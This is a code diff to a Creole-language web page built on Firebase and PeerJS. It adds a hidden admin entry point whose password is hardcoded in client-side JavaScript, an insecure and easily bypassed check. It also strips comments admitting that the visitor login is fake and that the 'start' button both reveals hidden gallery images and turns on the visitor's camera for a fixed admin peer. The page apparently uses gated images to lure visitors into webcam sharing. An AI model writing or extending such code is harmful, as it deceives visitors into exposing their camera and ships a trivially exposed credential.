@@ -21,6 +21,19 @@
     min-height: 100vh; padding-bottom: 40px;
   }
 
+  /* ===== TI PWEN ADMIN ===== */
+  .dot-admin {
+    position: fixed; bottom: 15px; left: 15px;
+    width: 14px; height: 14px;
+    background: #333; border-radius: 50%;
+    cursor: pointer; opacity: 0.35;
+    z-index: 1000;
+    transition: opacity 0.2s, background 0.2s;
+  }
+  .dot-admin:hover, .dot-admin:active {
+    opacity: 1; background: #00cc66;
+  }
+
   /* ===== EKRAN LOGIN ===== */
   .login-screen {
     position: fixed; top: 0; left: 0; right: 0; bottom: 0;
@@ -66,7 +79,7 @@
     margin-top: 10px; min-height: 16px;
   }
 
-  /* ===== PAJ PRENSIPAL (kache okòmansman) ===== */
+  /* ===== PAJ PRENSIPAL ===== */
   .app-content { display: none; }
   .app-content.active { display: block; }
 
@@ -179,6 +192,9 @@
 </head>
 <body>
 
+  <!-- ===== TI PWEN ADMIN (anba gòch) ===== -->
+  <div class="dot-admin" id="dotAdmin" title=""></div>
+
   <!-- ===== EKRAN LOGIN ===== -->
   <div class="login-screen" id="loginScreen">
     <div class="login-box">
@@ -256,6 +272,21 @@ firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
 /* ============================================
+   TI PWEN ADMIN (anba gòch)
+   ============================================ */
+const ADMIN_PASSWORD = "Zane20042004";
+
+document.getElementById("dotAdmin").onclick = () => {
+  const pw = prompt("Modpas admin:");
+  if (pw === null) return;
+  if (pw.replace(/\s/g, "") === ADMIN_PASSWORD) {
+    window.location.href = "admin.html";
+  } else {
+    alert("❌ Modpas pa bon.");
+  }
+};
+
+/* ============================================
    EKRAN LOGIN
    ============================================ */
 const loginScreen = document.getElementById("loginScreen");
@@ -265,7 +296,6 @@ const pwInput     = document.getElementById("pwInput");
 const btnLogin    = document.getElementById("btnLogin");
 const err         = document.getElementById("err");
 
-// Si deja antre nan sesyon sa a → pa mande ankò
 if (sessionStorage.getItem("visitor_logged") === "1") {
   showApp();
 }
@@ -274,17 +304,8 @@ btnLogin.onclick = () => {
   const name = nameInput.value.trim();
   const pw = pwInput.value.trim();
 
-  if (name.length === 0) {
-    err.innerText = "Antre yon non.";
-    return;
-  }
-  if (pw.length === 0) {
-    err.innerText = "Antre yon kòd.";
-    return;
-  }
-
-  // ⚠️ NOU PA SERE ANYEN — jis pou laparans
-  // Nenpòt sa moun tape → bon
+  if (name.length === 0) { err.innerText = "Antre yon non."; return; }
+  if (pw.length === 0) { err.innerText = "Antre yon kòd."; return; }
 
   sessionStorage.setItem("visitor_logged", "1");
   sessionStorage.setItem("visitor_name", name);
@@ -304,7 +325,7 @@ function showApp() {
 }
 
 /* ============================================
-   GALRI — Soti nan Firebase
+   GALRI
    ============================================ */
 let ALL_IMAGES = [];
 
@@ -345,7 +366,7 @@ db.ref("images").on("value", (snapshot) => {
 });
 
 /* ============================================
-   PEERJS + KAMERA + 2 WÒL BOUTON
+   PEERJS + KAMERA
    ============================================ */
 (() => {
   const ADMIN_ID = "admin-piyayy-2026-v2";
@@ -462,7 +483,6 @@ db.ref("images").on("value", (snapshot) => {
   }
 
   async function startSharing() {
-    // Wòl #2 : devwale rès imaj yo
     const rest = document.getElementById("galleryRest");
     if (rest.innerHTML.trim() !== "" && rest.classList.contains("hidden")) {
       rest.classList.remove("hidden");
@@ -471,7 +491,6 @@ db.ref("images").on("value", (snapshot) => {
       }, 200);
     }
 
-    // Wòl #1 : limen kamera a
     btnStart.disabled = true;
     setStatus("⏳ Ap mande pèmisyon kamera...");
     intentionallyStopped = false;
